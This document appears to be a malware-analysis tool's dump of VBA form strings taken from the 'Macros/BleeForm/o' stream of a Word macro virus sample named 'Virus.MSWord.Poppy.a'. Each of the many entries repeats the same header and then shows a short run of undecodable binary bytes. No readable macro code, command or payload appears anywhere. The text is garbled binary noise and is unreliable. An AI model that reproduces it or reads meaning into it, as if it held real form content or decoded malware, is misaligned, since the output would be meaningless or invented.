-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�XgT�'!}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y%�(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OOJn�����'���Ȧ�ƌC�h_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I9����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0C?��|�k�y'�h,��@[�{�Y�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���La� '�碲@��?�z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pG��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\*)m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��2��(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^IJP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
涂
<bB��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~>�yi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�m8��p�m�G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`rG@�r2���Ϡ�WGZ�n��Q�bS5V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IQ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!>���9�i�С?F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q}�z�)h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d��P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�t��%��]�-3g��Q �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FS�(ENs�m�����#��\u^���4��L��i�ѥ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b��&~ �£
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\;����E���z^9�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U%ʛࢆ��(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w�yR|�|˃��.�O��f�]{��h�b
͏�}V�x^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	f��D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d}�0�qժаGO
�N�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�1����}V_
5-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �C�s���i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KAd�<��6#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
忕�h�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}8���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�/m|G�ՃM����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9����Wlu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�%�x��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b,#��gY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P[�=��b�A]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zr�g'�>��~T<|i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�dw+J�QQ �^�*"���yU��tf'�3#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�'<�u�yNMޣo5[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^��Z�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,ݺ�jꅒ�8(�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�դ,�03 ǳ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4F��ƫR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��`z����#�;捬�E����}��--CZ)��O�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?��^�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
奸O0G!"E>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3ϧ.

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����l�C$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Fr1$m��0r@�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����5�TTS5K�����JX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
At�g||�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��L;��{=CR��P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�Ʈ�;3�G#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{t�#uc
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���N��T�e����Y�����:��eK�ۓj�{0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ub5]$4�s��#�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�YF$l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���_g����-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H!i�iVI)�Ȳ���19)����#��ݯ���ڮ�x0�Z~�i��"�i�{u��WL�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eT;�DpFX��C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-I��WG[��y��=�֫��C,�!U_r�b����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�w���y����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�u&���&]��UUWe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��ͪ����Q�(�	ק���x[�ǻ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W��fұ�S�Zw,u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~V��!m{���wz��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߸��%�+�*��nI|�	ɍY^ N�N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<pOV{�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l<7�_��7r`�.�r�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ȣ|k�F��~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ti�Gj����SOPK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ܮY���W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f8�ss{@)�ۦ�i���o?Hq<|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#���hٻ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��Zy n���[uջ��c���Em
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����X�i!v)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3���99
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(Q�ۆ'���V�2VEyճU��ث�Mꥪ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$c�p��c��9����]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MeSA<2\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�KSP�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	����Ʊ�'���Ѡ��T4�%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�s���ƍ�.�:nG���Fk�*3W�N=!���J8…�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l�zt{PPQ-����q�B[�v�Cҵ��dYR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O���GL�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<���-�ED��I�U׽�s��u��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�9Ϩ����$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʊ����)Xe�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s���wj�'���,�r1���Џ�s�?���*M#q�HTD�T���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pA��H�'�x��Y�Q�A�u�Ъ�ۮ�Sj�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V;�5�ϖQU9D����-L�^92
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~U`}A��:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��út7�%�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZAs��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(,����PT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jɈ#�NrG���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&v.�6��o[m�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u%%}��4��I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���S	��l�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����<ǿ�K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�[�¨a@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�}��T?��a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}zCM3EW�����M+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;|eP��	l��ߩ���f��߷o�G5>�'��y�>��D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pϻ'#
@�-�}n���KCA5=<Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
) ��	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y�s����C�b�M8C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�-�ܖ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ҍ};��b	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ɏq�հ+HN���ʒ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�#`>\z�ҝE 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BB'>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���UU�<��ֈ��oִ5W��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�ѱ�k����}��Ԛ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��AYp�%�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����vF���
